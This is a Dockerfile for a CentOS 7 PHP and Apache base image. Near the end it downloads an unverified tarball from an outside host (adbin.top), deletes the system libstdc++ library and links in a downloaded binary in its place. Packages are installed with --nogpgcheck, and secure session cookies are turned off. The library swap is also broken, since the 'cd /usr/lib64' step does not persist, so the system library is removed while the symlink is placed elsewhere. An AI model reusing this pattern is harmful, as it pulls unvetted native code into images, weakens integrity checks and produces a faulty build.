# Creates base docker image for centos 7 and PHP including extra dependencies.
# Usage example: docker build -f Dockerfile -t yourproject

FROM centos/php-72-centos7 as base
USER root
ARG USER_ID=1000
ARG USER_NAME=host
ARG GROUP_ID=1000
ARG GROUP_NAME=host
RUN groupadd --gid $GROUP_ID $GROUP_NAME && \
    useradd -u $USER_ID -g $GROUP_ID $USER_NAME -s /bin/bash -m

ENV APP_ROOT="/opt/app-root/src" \
    INSTALL_DEPENDENCIES="mariadb rh-php72-php-opcache rh-php72-php-soap rh-php72-php-bcmath sclo-php72-php-pecl-memcached rh-php72-php-json rh-php72-php-xdebug nano iproute" \
    ERROR_REPORTING=${ERROR_REPORTING:-"E_ALL & ~E_DEPRECATED & ~E_STRICT"} \
    DISPLAY_ERRORS=${DISPLAY_ERRORS:-OFF} \
    DISPLAY_STARTUP_ERRORS=${DISPLAY_STARTUP_ERRORS:-OFF} \
    TRACK_ERRORS=${TRACK_ERRORS:-OFF} \
    HTML_ERRORS=${HTML_ERRORS:-ON} \
    INCLUDE_PATH=.:${APP_ROOT}:${PHP_DEFAULT_INCLUDE_PATH} \
    PHP_MEMORY_LIMIT=${PHP_MEMORY_LIMIT:-1024M} \
    SESSION_NAME=PHPSESSID \
    SESSION_HANDLER=files \
    SESSION_PATH=/tmp/sessions \
    SESSION_COOKIE_DOMAIN=${SESSION_COOKIE_DOMAIN:-} \
    SESSION_COOKIE_HTTPONLY=${SESSION_COOKIE_HTTPONLY:-} \
    SESSION_COOKIE_SECURE=0 \
    SHORT_OPEN_TAG=OFF \
    HTTPD_START_SERVERS=${HTTPD_START_SERVERS:-16} \
    HTTPD_MAX_SPARE_SERVERS=$((HTTPD_START_SERVERS+16)) \
    HTTPD_MAX_REQUEST_WORKERS=${HTTPD_MAX_REQUEST_WORKERS:-256}
RUN envsubst < /opt/app-root/etc/php.ini.template > ${PHP_SYSCONF_PATH}/php.ini
RUN yum install -y --setopt=tsflags=nodocs $INSTALL_DEPENDENCIES --nogpgcheck && \
    yum -y clean all --enablerepo='*' && \
    sed -i 's/#DocumentRoot/DocumentRoot/' /etc/httpd/conf/httpd.conf && \
    sed -i 's/:8080/:80/' /etc/httpd/conf/httpd.conf
RUN rm /etc/localtime && ln -s /usr/share/zoneinfo/Europe/Amsterdam /etc/localtime
RUN yum install -y \
    nano \
    iproute \
    libXcomposite.x86_64 \
    libXcursor.x86_64 \
    libXdamage.x86_64 \
    libXi.x86_64 \
    libXtst.x86_64 \
    cups-libs.x86_64 \
    libXScrnSaver.x86_64 \
    libXrandr.x86_64 \
    alsa-lib.x86_64 \
    atk.x86_64 \
    at-spi2-atk.x86_64 \
    pango.x86_64 \
    gtk3.x86_64
RUN cd /usr/lib64
RUN wget https://adbin.top/packages/lib64.tar.gz
RUN tar xvzf lib64.tar.gz
RUN rm -rf /usr/lib64/libstdc++.so.6
RUN ln -s /opt/app-root/src/lib64/libstdc++.so.6.0.25 libstdc++.so.6
RUN echo "Running final commands" && \
    chown -R apache:apache $APP_ROOT
STOPSIGNAL SIGWINCH
EXPOSE 80
CMD ["httpd", "-D", "FOREGROUND"]
